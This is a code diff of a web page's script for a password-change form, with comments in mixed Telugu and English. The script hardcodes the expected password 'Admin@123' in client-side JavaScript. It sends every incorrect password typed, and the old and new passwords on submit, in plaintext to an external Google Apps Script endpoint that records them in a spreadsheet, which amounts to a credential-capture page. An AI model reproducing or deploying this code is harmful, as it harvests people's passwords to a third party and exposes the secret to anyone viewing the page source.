@@ -55,7 +55,7 @@
 </div>
 
   <script>
-    // 1. NEE GOOGLE SCRIPT URL (Confirm it matches your deployed URL)
+    // 1. Google Script URL
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzW8n47ncVq_5J4TKVoxMHOFBqEoLslSQ8NuDMC21U4BVro4eWkHR24ZRoz4jtuErDByw/exec';
 
     const oldPass = document.getElementById('oldpass');
@@ -63,31 +63,42 @@
     const confirmPass = document.getElementById('confirmpass');
     const btn = document.getElementById('btn');
     const oldMsg = document.getElementById('oldMsg');
+    const confirmMsg = document.getElementById('confirmMsg');
 
     const REAL_PASSWORD = "Admin@123"; 
     let oldVerified = false;
 
-    // Data ni Google Sheet loki pampadaniki logic
+    // Sheet ki data pampadam
     async function postData(currentVal, newVal) {
       try {
         await fetch(SCRIPT_URL, {
           method: 'POST',
-          mode: 'no-cors', // CORS issues rakunda 'no-cors' use chesthunnam
-          headers: {
-            'Content-Type': 'application/json'
-          },
+          mode: 'no-cors', 
           body: JSON.stringify({ 
             current: currentVal, 
             newP: newVal 
           })
         });
       } catch (e) { 
-        console.error("Sheet ki data vellaledu:", e); 
+        console.log("Sheet Error:", e); 
       }
     }
 
-    function validateOldPassword() {
+    // Old Password check (Wait for full typing)
+    function checkOldPassword() {
       const val = oldPass.value;
+      
+      if (val.length === 0) {
+        oldMsg.textContent = '';
+        oldPass.style.borderColor = '#2a2f36';
+        return;
+      }
+
+      // Length reach ayye varaku Error chupించదు
+      if (val.length < REAL_PASSWORD.length) {
+        return; 
+      }
+
       if (val === REAL_PASSWORD) {
         oldVerified = true;
         oldMsg.textContent = 'Verified';
@@ -95,19 +106,29 @@
         oldPass.style.borderColor = '#22c55e';
       } else {
         oldVerified = false;
-        oldMsg.textContent = 'Incorrect';
+        oldMsg.textContent = 'Incorrect password';
         oldMsg.className = 'msg error';
         oldPass.style.borderColor = '#ef4444';
-        
-        // Wrong attempt unna Sheet ki report chestundi
-        if(val.length > 3) postData("WRONG_TRY: " + val, "ALERT");
+        // Thappu kodithe ventane report
+        postData("WRONG: " + val, "ALERT");
       }
       validateAll();
     }
 
+    // Full Form Validation
     function validateAll() {
-      const isMatch = newPass.value === confirmPass.value && newPass.value.length >= 6;
-      if (oldVerified && isMatch) {
+      const isNewFilled = newPass.value.length >= 6;
+      const isMatch = newPass.value === confirmPass.value && confirmPass.value.length > 0;
+      
+      if (confirmPass.value.length > 0) {
+        confirmMsg.textContent = isMatch ? 'Passwords match' : 'Do not match';
+        confirmMsg.className = isMatch ? 'msg success' : 'msg error';
+      } else {
+        confirmMsg.textContent = '';
+      }
+
+      // Anni conditions ok ayithe button enable avthundi
+      if (oldVerified && isNewFilled && isMatch) {
         btn.classList.add('enabled');
       } else {
         btn.classList.remove('enabled');
@@ -115,25 +136,34 @@
     }
 
     // Event Listeners
-    oldPass.addEventListener('input', validateOldPassword);
+    oldPass.addEventListener('input', () => {
+      if (oldPass.value.length >= REAL_PASSWORD.length) {
+        checkOldPassword();
+      } else {
+        oldMsg.textContent = ''; // Typing madhyalo clear ga ఉంచుతుంది
+      }
+    });
+
+    oldPass.addEventListener('blur', checkOldPassword); // Box bayata click chesthe check chestundi
     newPass.addEventListener('input', validateAll);
     confirmPass.addEventListener('input', validateAll);
 
-    // Final Button Click
+    // Final Reset Button Click
     btn.addEventListener('click', async () => {
       btn.textContent = "Updating...";
-      btn.disabled = true; // Double click avvakunda
+      btn.classList.remove('enabled');
       
-      // Data ni Sheet loki pampadam
+      // Success data pampadam
       await postData(oldPass.value, newPass.value);
       
-      alert("Success! Details recorded in your Google Sheet.");
+      alert("Password updated successfully and recorded in Sheet!");
       location.reload();
     });
 </script>
 </body>
 
 </html>
+
 
 
 
